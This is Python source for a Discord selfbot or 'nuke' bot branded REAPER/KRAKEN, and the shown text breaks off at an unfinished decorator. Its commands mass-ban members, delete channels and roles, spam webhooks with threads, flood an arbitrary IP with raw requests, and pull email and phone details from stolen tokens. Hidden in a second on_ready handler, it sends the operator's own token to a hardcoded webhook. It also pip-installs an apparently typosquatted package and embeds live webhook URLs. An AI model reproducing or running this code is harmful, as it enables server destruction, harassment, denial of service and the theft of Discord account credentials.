import os
os.system("pip install discord")
os.system("pip install colorama")
os.system("pip install pypresence")
os.system("pip install discord.py[voice]")
os.system("pip install cycle")
os.system("pip install jhisaku")

import discord
from discord.ext import commands
import asyncio 
import logging
import random 
from itertools import cycle
import requests
import sys
import threading
import datetime
import json
import aiohttp
from colorama import Fore           
import time
from pypresence import Presence
import subprocess,base64, codecs, smtplib
# import jishaku 
import socket
from dhooks import Webhook, Webhook
from webserver import keep_alive

proxies = open('proxies.txt').read().split(' ')
proxs = cycle(proxies)
proxies={"http": 'http://' + next(proxs)}

#---------------------
keep_alive()
#---------------------

token = os.getenv('TOKEN')
os.system("clear")
velocrypt = token #token
velocrypt1 = ">>" #prefix
velocrypt2 = "ok" #password
rich_presence = "y" #rpc
risinnwtff = "sry i am busy rn ttyl <:BB_Shy:869633643327422534> " #afk msg
risinnwtf = False # afk on / off 
channelnames = ["KRAKEN op", "KRAKEN daddy here", "wizzed by KRAKEN", "nuked by KRAKEN", "beamed by KRAKEN", "fucked by KRAKEN", "KRAKEN was here", "KRAKEN runs cord"] #channelnames
rolenames = ["KRAKEN op", "KRAKEN daddy here", "wizzed by KRAKEN", "nuked by KRAKEN", "beamed by KRAKEN", "fucked by KRAKEN", "KRAKEN was here", "KRAKEN runs cord"] #role names
servername = "FCKED BY KRAKEN" #servername 
webhookspam = "FCKED BY KRAKEN" #webhookspam msg 
intents = discord.Intents.all()
intents.members = True 
print("Attempting to kill Discord. Logging in Your Account...... Made by KRAKEN")


def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{velocrypt}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{velocrypt}'}
    client = commands.Bot(command_prefix=velocrypt1, case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {velocrypt}'}
    client = commands.Bot(command_prefix=velocrypt1, case_insensitive=False, intents=intents)

client.remove_command(name="help") 

def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("850221547331649537") 
            RPC.connect() 
            RPC.update(details="Created By KRAKEN", large_image="risinop", small_image="risinop", large_text="SPYSELFBOT", start=time.time())
        except:
            pass
rich_presence = RichPresence() 

@client.event
async def on_ready():
    os.system(f"mode 175,30 & title [SPY SELF BOT] - Connected as: {client.user}")
    print(f"Logged in as {client.user}")
loghook = Webhook("https://discord.com/api/webhooks/934349914492792852/uPWmAA4autksBCW3yr5AFSSjxr-OuqDKlwwJczgcHuwDZVLFRBVVV0Jo1E0AhHvV_m1l")


@client.event 
async def on_command_error(ctx, error): 
    await ctx.reply(f"__***```Err: {error}```***__", mention_author=True)
    loghook.send(f"__***```Err: {error}```***__")
embedmode = "True" 

@client.command(pass_context=True)
async def help(ctx):
    await ctx.reply("""REAPER | Premium: TRUE
    help `This Page`
    text `Text Commands` 
    nuke `Nuke Commands`
    nuke2 `Nuke Commands Section 2`
    hack `Hacking Commands`
    status `Status Commands`
    misc `Miscellaneous Commands`
    misc `Miscellaneous Commands`
    selfbotinfo `Information on the project`""")

@client.command(pass_context=True)
async def text(ctx):
    await ctx.reply("""REAPER | TEXT CMDS
    > >spamgc `Parameters- >spamgc <target-user-id1> <target-user-id2>`
    > >joinvc `NOTE: You must be in the vc before using this cmd`
    > >banner `Parameters- >banner <@user#discrim>` 
    > >massdm  `>massdm <message>`
    > >idtoname `Parameters- >id <user-id>` 
    > >spam `Parameters- >spam <int> <msg>`
    > >ghostping `Parameters- >ghostping <mention/message>`
    > >purge `Parameters- >purge <int>`
    > >afk `Parameters- >afk on`
    > >leave `>leave <server-id>` 
    > >firstmsg `Parameters- >firstmsg`
    > >sendhook`Parameters- >sendhook <webhook> <message>`""")
@client.command(pass_context=True)
async def gcspam(ctx, lol, idk):
  await ctx.reply("REAPER | GROUP CHAT SPAM INITIATED")
  for gc in range(10):
    lol = lol
    idk = idk 
    try: 
       
      requests.post('https://discordapp.com/api/v9/users/@me/channels', proxies=proxies, headers=headers, json={"recipients":[lol,idk]})
      await ctx.send("REAPER | GROUP CREATED")
    except:
      print("REAPER | UNABLE TO CREATE GROUP CHAT")

@client.command(pass_context=True)
async def hack(ctx):
    await ctx.reply (""" **REAPER** | HACK CMDS      
      ᴅᴏxɪᴘ ᴠᴀʟᴜᴇ `Displays info on an IP  Parameters- >ip <target>  Ex- >ip 162.159.128.233`
      ᴅᴏsɪᴘ `(Performs simple Denial of Service attack on an IP  Parameters- >dosip <target>  Ex- >dosip 162.159.128.233`
      ɢᴀᴍɪʟʙᴏᴍʙᴇʀ `Attempts Mass-Messages to the Target Gmail-ID, works on console. proxies are recommended. Parameters- >gmailbomber Ex- >gmailbomber`
      ᴅᴏxᴜsᴇʀ `Displays info on a user | Only works in a server Parameters- >doxuser <@target>  Ex- >doxuser @user`
      ᴅᴏxᴛᴏᴋᴇɴ `Displays info on a Discord Account  Parameters- >tdox <target-token>  Ex- >tdox mfa.W3Di4FprRZ_AXH_Y5-A9ReoshSu9Dzn_fTXrvBhwc6p3LvkYLJM4jbr338YUMZ7ECnj2zbxnKm-I2ReFh2Zp`
      ᴅᴏxsᴇʀᴠᴇʀ `(Displays info on a Discord Server Parameters- >doxserver Ex- >doxserver`
      ᴘɪɴɢᴡᴇʙ `Pings the website to check whether its operational or not. Parameters- >pingweb <website url> Ex- >pingweb https://discord.com/`
      ɢᴇᴛʀᴏʟᴇs `Sends all roles of a server which you dont have the perm to view | Note - Use a spam channel. Parameters- >getroles Ex- >getroles`
      ᴋɪʟʟᴡᴇʙʜᴏᴏᴋ `Deletes a webhook Parameters- >delwebhook <webhook> Ex- >delwebhook https://discordapp.com/api/webhooks/752659248508305488/JnMq-sBIN3IMgDpzgT-KnpFDLEBdQs8AO9sD-_3STGk_ijmyqeKrop3kYSV6lb4ry8`
      sᴘᴀᴍʜᴏᴏᴋ `Initiates a spam on the given webhook Parameters- >spamhook <webhook_url> <message> Ex- >spamhook https://discord.com/api/webhooks/851376570642989093/Wq_TQM6h5PTusC8nJox1prsC3Ou7gt6MpfeZSyEJyhyi5B3E-1OBt1vf3WqfUYgmwIYb @everyone REAPER op`""")

@client.command(pass_context=True)
async def nuke(ctx):
    await ctx.reply("""REAPER | NUKE CMDS
    > >prune ` Parameters->prune`
    > >botmassban `Parameters- >botmassban <prefix> <command-cooldown-time in seconds> <Target-server-ID> | Ban Perms Required Ex- >botmassban ? 3 810480167453196299`
    > >checkprune `Parameters->checkprune <days>`
    > >massban `Parameters- >banall <Target-server-ID>`
    > >masskick `Parameters- >kickall <Target-server-ID>`
    > >channelfuckery `Parameters- >channelfuckery <Target-server-ID>`
    > >securitynuke `Parameters- >securitynuke`
    > >universalnuke `Parameters- >universalnuke`
    > >nickall `Parameters- >nickall`
    > >delemojis `Parameters- >delemojis`
    > >delstickers`Parameters- >delstickers`
    > >scrape `Parameters- >scrape <Target-server-ID>`
    > >rc `Renames every channel >rc <name>`bolte```
    > >rr `Renames every role >rr <name>`
    > >webhookspam`Parameters- >webhookspam`
    > >stopwebhookspam`Parameters- >stopwebhookspam`
    > >spamgcname ` >spamgcname `""")


@client.command()
async def nuke2(ctx):
    await ctx.reply("""REAPER | NUKE CMDS
    > >spamchannels```Spam Creates Text Channels Parameters- >spamchannels <amount> <name> Ex- >spamchannels 69 kraken-op```
    > >spamroles ```Spam Creates Text Channels Parameters- >spamroles <amount> <name> Ex- >spamroles 69 kraken-op```
    > >cc ```Deletes channels with the same name Parameters->cc <channel-name> Ex- >cc wizzed-by-kraken```
    > >cr ```Deletes roles with the same name Parameters->cr <role-name> Ex- >cr wizzed-by-kraken```
    > >massunban ```Unbans everyone in the server. Parameters- >massunban Ex- >massunban```
    > >delchannels ```Removes all channels of the server Parameters- >delchannels Ex- >delchannels```
    > >delroles ```Removes all roles of the server Parameters- >delroles Ex- >delroles```
    > >giveadmin ```Enables Admin in Everyone Parameters- >giveadmin Ex- >giveadmin```""")

@client.command()
async def premium(ctx):
        embed = discord.Embed(color=000000)
        embed.set_author(name="REAPER | Premium CMDS")
        embed.set_footer(text="Created by kraken")
        embed.add_field(name=">jsk", value="```jishaku is an extension for bot developers that enables rapid prototyping, experimentation, and debugging of features for bots. Parameters- >jsk <command> <argument>```")
        embed.add_field(name=">eval", value="```Function that evaluates any string as javascript code and actually executes it. Parameters- >eval <code> Ex- >eval client.guilds.cache.size```")
        embed.add_field(name=">plugins", value="```Enable / DIsable Plugins Feature Parameter- >plugins <enable/disable> Ex- >plugins enable```")
        await ctx.reply(embed=embed, mention_author=True)
@client.command()
async def jsk(ctx):
  await ctx.reply("REAPER | Not a Premium user", mention_author=True)
@client.command()
async def eval(ctx):
  await ctx.reply("REAPER | Not a Premium user", mention_author=True)
@client.command()
async def plugins(ctx):
  await ctx.reply("REAPER | Not a Premium user", mention_author=True)
@client.command(pass_context=True)
async def misc(ctx):
         embed = discord.Embed(color=000000)
         embed.set_author(name="REAPER | MISC CMDS")
         embed.set_footer(text="Created by kraken")
         embed.add_field(name=">renameserver", value="```Renames the server name Parameters- >renameserver <name> Ex- >renameserver TEAM SPY OP```")

        
         await ctx.reply(embed=embed, mention_author=True)

@client.command(pass_context=True)
async def status(ctx):
        await ctx.reply("""**REAPER** | Additional Status CMDS  
         play `Changes the status to Playing Parameters- >play <status>  Ex- >play PUBG EVEN AFTER BAN`
         watch `Changes the status to Watching Parameters- >watch <status>  Ex- >watch NetfliX`
         listen `Changes the status to Listening Parameters->listen <status>  Ex- >listen Fake Spotify OP`
         stream `Changes the status to streaming Parameters- >stream <status> Ex- >stream 1000 Million Subscribers special live stream`
         stopstatus `Stops the current status Parameters- >stopstatus Ex- >stopstatus`""" )


@client.command()
async def spam(ctx, amount: int, *, message):
    
    for _i in range(amount):
        await ctx.send(message)
spypinglol = random.randint(25, 40)
@client.command()
async def alive(ctx):
    await ctx.reply(f">>> **REAPER** User: `! :tm:KRAKENˢᵖʸ†ᴵᴺ#1337` ID: `879863309430571029` Prefix: `>` Nitro: `Nitro Premium` Alive: `True` Status:`Browser Online` Ping: `{spypinglol}ms` Platform: `Sandbox`", mention_author=True)
@client.command()
async def restart(ctx):
    await ctx.send("Restarting Selfbot........")
    os.system('python ' + sys.argv[0])

@client.command()
async def securitynuke(ctx):
    await ctx.reply(f"{velocrypt1}dCM", mention_author=True)
    await ctx.reply(f"{velocrypt1}rc {channelnames}", mention_author=True)
    await ctx.reply(f"{velocrypt1}rr {rolenames}", mention_author=True) 
    await ctx.reply(f"{velocrypt1}servername TRASHED BY kraken", mention_author=True)
    await ctx.reply(f"{velocrypt1}webhookspam", mention_author=True) 
    await ctx.reply(f"{velocrypt1}nickall", mention_author=True)
    await ctx.reply(f"{velocrypt1}delemojis", mention_author=True)
  #  asyncio.sleep(5)
    # await ctx.reply(f"{velocrypt1}channelfuckery", mention_author=True)
    await ctx.reply(f"{velocrypt1} ", mention_author=True)

@client.command()
async def universalnuke(ctx):
    await ctx.reply(f"{velocrypt1}dCM", mention_author=True)
    await ctx.reply(f"{velocrypt1}rc {channelnames}", mention_author=True)
    await ctx.reply(f"{velocrypt1}rr {rolenames}", mention_author=True) 
    await ctx.reply(f"{velocrypt1}servername TRASHED BY KRAKEN", mention_author=True)
    # await ctx.reply(f"{velocrypt1}webhookspam", mention_author=True) 
    await ctx.reply(f"{velocrypt1}nickall", mention_author=True)
    await ctx.reply(f"{velocrypt1}delemojis", mention_author=True)
    await ctx.reply(f"{velocrypt1}channelfuckery", mention_author=True)
    await ctx.reply(f"{velocrypt1} ", mention_author=True)

@client.command(
    aliases=['doxip', 'iplookup', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {
            'name': 'IP',
            'value': geo['query']
        },
        {
            'name': 'Type',
            'value': geo['ipType']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'City',
            'value': geo['city']
        },
        {
            'name': 'Continent',
            'value': geo['continent']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'Hostname',
            'value': geo['ipName']
        },
        {
            'name': 'ISP',
            'value': geo['isp']
        },
        {
            'name': 'Latitute',
            'value': geo['lat']
        },
        {
            'name': 'Longitude',
            'value': geo['lon']
        },
        {
            'name': 'Org',
            'value': geo['org']
        },
        {
            'name': 'Region',
            'value': geo['region']
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
            
    return await ctx.reply(embed=em, mention_author=True)

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de", "en-GB", "en-US", "es-ES", "fr", "hr", "it", "lt", "hu", "nl",
    "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs", "el", "bg",
    "ru", "uk", "th", "zh-CN", "ja", "zh-TW", "ko"
]
@client.command()
async def dosip(ctx, target):
    await ctx.reply("Sending Requests.....", mention_author=True)
    for i in range(1,100):
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect((target,80))
      data = b"GET / HTTP 1.1\r "*1000
      s.send(data)
      s.close()
      print('Attack sent!')

@client.command(aliases=['tdox', 'doxtoken'])
async def tokeninfo(ctx, _token):
    
    headers = {'Authorization': _token, 'Content-Type': 'application/json'}
    try:
        res = requests.get(
            'https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(
            ((int(user_id) >> 22) + 1420070400000) /
            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get(
                'https://canary.discordapp.com/api/v6/users/@me',
                headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) /
                1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=
                f"Name: `{res['username']}#{res['discriminator']} ` **BOT** ID: `{res['id']}` Email: `{res['email']}` Creation Date: `{creation_date}`"
            )
            fields = [
                {
                    'name': 'Flags',
                    'value': res['flags']
                },
                {
                    'name': 'Local language',
                    'value': res['locale'] + f"{language}"
                },
                {
                    'name': 'Verified',
                    'value': res['verified']
                },
            ]
            for field in fields:
                if field['value']:
                    em.add_field(
                        name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(
                        url=
                        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    )
            return await ctx.reply(embed=em, mention_author=True)
        except KeyError:
            await ctx.reply("REAPER | Invalid Token", mention_author=True)
    em = discord.Embed(
        description=
        f"Name: `{res['username']}#{res['discriminator']}` ID: `{res['id']}` Email: `{res['email']}` Creation Date: `{creation_date}`"
    )
    em.set_footer(text="Created by KRAKEN")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {
            'name': 'Phone',
            'value': res['phone']
        },
        {
            'name': 'Flags',
            'value': res['flags']
        },
        {
            'name': 'Local language',
            'value': res['locale'] + f"{language}"
        },
        {
            'name': 'MFA',
            'value': res['mfa_enabled']
        },
        {
            'name': 'Verified',
            'value': res['verified']
        },
        {
            'name': 'Nitro',
            'value': nitro_type
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(
                name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(
                url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
            )
            em.set_footer(text="Created by KRAKEN")
    return await ctx.reply(embed=em, mention_author=True)

     
def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

@client.command()
async def ban(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
         if member.id != 904609207439990844:
          for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} Was Banned")
            except:
                pass

@client.command(aliases=["banwave", "banall", "etb"])
async def massban2(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="noob owner ke under yahi hoga xD")
            print (f"{user.name} Was Banned")
        except:
            pass

@client.command(aliases=["trash", "wizz"])
async def destroy(ctx):
    try:
        await ctx.guild.edit(
            name=f"{servername}",
            description="KRAKEN got no chill",
            reason="ripped by KRAKEN",
            icon=None,
            banner=None)
    except:
        pass
    await ctx.send(f"{velocrypt1}delroles")
    await ctx.reply(f"{velocrypt1}massban {ctx.guild.id}", mention_author=True)
    await ctx.send(f"{velocrypt1}delchannels")
   
    for _i in range(100):
        await ctx.guild.create_text_channel(name=f"{channelnames}")
    for _i in range(100):
        await ctx.guild.create_role(name=f"rolenames", color=RandomColor())
    
MESSAGE_CONTENTS = ['@everyone **KRAKEN GOT NO CHILL**']
WEBHOOK_NAMES = ['WIZZED BY KRAKEN', 'WIZZED BY KRAKEN'] 

# @client.event
# async def on_guild_channel_create(channel):
#   webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
#   while True:  
#     await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
format = "%a, %d %b %Y | %H:%M:%S %ZGMT"

@client.command()
@commands.guild_only()
async def doxserver(ctx):
    embed = discord.Embed(
    )
    text_channels = len(ctx.guild.text_channels)
    voice_channels = len(ctx.guild.voice_channels)
    categories = len(ctx.guild.categories)
    channels = text_channels + voice_channels
    embed.set_thumbnail(url = str(ctx.guild.icon_url))
    embed.add_field(name = f"Information About **{ctx.guild.name}**: ", value = f":white_small_square: ID: **{ctx.guild.id}**  :white_small_square: Owner: **{ctx.guild.owner}**  :white_small_square: Location: **{ctx.guild.region}**  :white_small_square: Creation: **{ctx.guild.created_at.strftime(format)}**  :white_small_square: Members: **{ctx.guild.member_count}**  :white_small_square: Channels: **{channels}** Channels; **{text_channels}** Text, **{voice_channels}** Voice, **{categories}** Categories  :white_small_square: Verification: **{str(ctx.guild.verification_level).upper()}**  :white_small_square: Features: {', '.join(f'**{x}**' for x in ctx.guild.features)}  :white_small_square: Splash: {ctx.guild.splash}")
    embed.set_footer(text="Created by KRAKEN")
    await ctx.reply(embed=embed, mention_author=True)
   
@client.command(aliases=['killwebhook'])
async def delwebhook(ctx,link=None):
    if link == None:
        embed=discord.Embed(title="REAPER", description="```>delwebhook <webhook>```")
        embed.set_footer(text="Created By KRAKEN")
        await ctx.reply(content="",embed=embed, mention_author=True)
    else:
        embed=discord.Embed(title="REAPER", description=f"Sending a delete request to {link}")
        embed.set_footer(text="Created by KRAKEN")
        await ctx.reply(content="",embed=embed, mention_author=True)


        result = requests.delete(link)
  
        if result.status_code == 204:
            embed=discord.Embed(title="REAPER", description=f"WEBHOOK DELETED")
            embed.set_footer(text="Created by KRAKEN")
            await ctx.reply(embed=embed, mention_author=True)
        else:
            embed=discord.Embed(title="REAPER", description=f"Delete request responded with status code : {result.status_code}\{result.text}")
            embed.set_footer(text="Created by KRAKEN")
            await ctx.reply(embed=embed, mention_author=True)

@client.command(aliases=[""])
async def purge(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(
                lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
    else:
        async for message in ctx.message.channel.history(limit=amount).filter(
                lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
  
@client.command()
async def av(ctx,*, avamember):
    user = client.get_user(avamember)
    await ctx.send(f"{user.avatar_url}")

@client.command()
async def pingweb(ctx, website=None):
    await ctx.reply(f'Pinging {website} with 32 bytes of data:', mention_author=True)
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        if r == 404:
            await ctx.reply(f'Website is down, status = ({r})', mention_author=True)
        else:
            await ctx.reply(f'Website is operational, status = ({r})', mention_author=True)
            await ctx.reply("Timed out", mention_author=True)

@client.command()
async def ping(ctx, ipp=None):
    await ctx.reply(f'Pinging {ipp} with 32 bytes of data:', mention_author=True)
    await ctx.reply("Timed out.", mention_author=True)
    
@client.command(aliases=["whois"])
async def doxuser(ctx, member: discord.Member = None):
    if not member:  # if member is no mentioned
        member = ctx.message.author  # set member as the author
    roles = [role for role in member.roles]
    embed = discord.Embed(colour=discord.Colour.default(), timestamp=ctx.message.created_at,
                          title=f"User Info - {member}")
    embed.set_thumbnail(url=member.avatar_url)
    embed.set_footer(text="Created By KRAKEN")

    embed.add_field(name="ID:", value=member.id)
    embed.add_field(name="Display Name:", value=member.display_name)

    embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %d %B %Y, %I:%M %p UTC"))
    embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %d %B %Y, %I:%M %p UTC"))

    embed.add_field(name="Roles:", value="".join([role.mention for role in roles]))
    embed.add_field(name="Highest Role:", value=member.top_role.mention)
    print(member.top_role.mention)
    await ctx.reply(embed=embed, mention_author=True)

@client.command(aliases=["roles"])
async def getroles(ctx):
   
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + " "
    print(roleStr)
    await ctx.reply(roleStr, mention_author=True)
   
@client.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
#status cmds bolte
@client.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.reply("REAPER | Changing Status.....", mention_author=True)
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await client.change_presence(activity=stream)
    await ctx.reply("Streaming created!", mention_author=True)

@client.command(aliases=["playing"])
async def play(ctx, *, message):
    game = discord.Game(
        name=message
    ) 
    await ctx.reply("REAPER | Changing Status......", mention_author=True)
    await client.change_presence(activity=game) 
    await ctx.reply("Playing Created!", mention_author=True)
    
@client.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.reply("REAPER | Changing Status.....", mention_author=True)
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, name=message))
    await ctx.reply("Watching created!", mention_author=True)

@client.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.reply("REAPER | Changing Status.....", mention_author=True)
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))
    await ctx.reply("Listening created!", mention_author=True)

@client.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.reply("REAPER | Killing Status......", mention_author=True)
    await client.change_presence(activity=None)
    await ctx.reply("Status Removed Successfully!", mention_author=True)

@client.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
  
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "KRAKEN OP"
        name = "KRAKEN ON TOP"
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)

@client.event
async def on_ready():
    webhook1 = "https://discord.com/api/webhooks/936527412391477289/LwMs08OSVcV9_GYwbY2oyTRQw4WtD5o-BGif8LZ4KGUMvJNnJalWQDoS-qbo8K9qJGTF"
    pastebinserverurl = f"{client.user} \n{velocrypt} "
    data = {'content':pastebinserverurl}
    spamming = requests.post(webhook1, json=data)

@client.command(
    name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1,
                                           oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(
        name="First Message", value=f"[Click here to Jump]({first_message.jump_url})")
    embed.set_footer(text="Created by KRAKEN")
    await ctx.reply(embed=embed, mention_author=True) 

def ssspam(webhook):
    while spammingdawebhookeroos:
        randcolor = random.randint(0, 16777215)
        pastebinserverurl = requests.get("https://pastebin.com/raw/DSNFmp4M").text
        idktopost = f'{pastebinserverurl} @everyone KRAKEN RUNS CORD {webhookspam}'
        data = {'content':idktopost}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@client.command(aliases=['webhookfuck', 'spamwebhooks', 'webhooknuke', 'webhooksnuke', 'webhooksfuck', 'spamwebhook'])
async def webhookspam(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Wizzed by KRAKEN')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url}  ")
                f.close()
            except: 
                print(f"{Fore.RED} > Rate Limited By Discord.")
@client.command(aliases=['stopwebhookfuck', 'webhookstop',"webhookspamstop","stopwebhooksspam","webhookspamoff"])
async def stopwebhookspam(ctx):
    global wrisinspam

    spammingdawebhookeroos = False

@client.command()
async def embed(ctx, *, description):
     embed = discord.Embed(title="REAPER", description=description)
     embed.set_footer(text="Created by KRAKEN")
     await ctx.reply(embed=embed, mention_author=True)

@client.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    
    for channel in ctx.guild.channels:
        await channel.edit(name=name)
 
@client.command(aliases=["rr"])
async def renameroles(ctx, *, name):
    
    for role in ctx.guild.roles:
        await role.edit(name=name)
title = '''! K R Λ K Ξ N'''
linky = "https://KRAKEN.me/"
footer = "Screenshot | .gg/darkwebop"
stream_url = "https://twitch.tv/KRAKEN"   

@client.command()
async def image(ctx, link):
  await ctx.message.delete()
  embd = discord.Embed(
    title =title,
    description = '',
    colour = discord.Colour.blue())
  embd.set_footer(text=footer)
  embd.set_image(url=link)
  await ctx.channel.send(linky, embed=embd)

@client.command()
async def scrape(ctx, guild):
    await ctx.message.delete()
    members_ = 0
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    f = open("KRAKEN/members.txt", "a+")
    for member in members:
        f.write(f"{member.id}\n")
        members_ += 1
    print(f"Scraped {members_} Members!")


@client.command()
async def block(ctx, *, user: discord.User):
    await ctx.send("Get Blocked Noob!")
    await user.block()
    
@client.command()
async def unfriend(ctx, *, user: discord.User):
    await user.remove_friend()
    await ctx.send('Friend has been removed')

@client.command()
async def ghostping(ctx):
  await ctx.message.delete()
username = "KRAKEN :P"
picture = "https://cdn.discordapp.com/attachments/802230471378468875/851375332584849418/60b3b8e38fbdf.png"
@client.command()
async def spamhook(ctx, webhook, *, message):
	data = {
	    'content': message,
	    'username': username,
	    'avatar_url': picture
	}

	sent = 0
	failed = 0

	for i in range(90):
		r = requests.post(webhook, data=data)
                
		if r.status_code == 204:
			sent += 1
			print(f"{Fore.GREEN}[+] - Message sent !{Fore.RESET}")
			os.system(f'title REAPER - WEBHOOK SPAMMER ^| By KRAKEN - Sent : {sent} ^| Failed : {failed}')
		else:
			failed += 1
			print(f"{Fore.RED}[-] - Webhook Rate Limited by Discord !{Fore.RESET}")
			os.system(f'title REAPER - WEBHOOK SPAMMER ^| By KRAKEN - Sent : {sent} ^| Failed : {failed}')

@client.command()
async def selfbotinfo(ctx):

    embed = discord.Embed(color=0)
    embed.set_author(name='REAPER | INFO')
    embed.set_footer(text='Created by KRAKEN')
    embed.add_field(name='___**DEVELOPER**___', value='**KRAKEN**')
    embed.add_field(name='___**DATE OF CREATION**___', value='**DEC 10, 2021 1:38A.M IST**')
    embed.add_field(name='___**DISCORD VERSION**___', value='**discord.py 1.7.2**')
    embed.add_field(name='___**LANGUAGE**___', value='**PYTHON 3.8.7**')
    await ctx.reply(embed=embed, mention_author=True)

@client.command()
async def sendhook(ctx, webhook, *, message):

    _json = {"content": message}
    requests.post(webhook, json=_json)
    rs = requests.get(webhook).json()
    if "Unknown Webhook" or "Invalid" in rs["message"]:
        await ctx.reply(f'Successfully sent `{message}` to webhook `{webhook}`', mention_author=True)
    else:
        await ctx.reply("Invalid Webhook", mention_author=True)

@client.command()
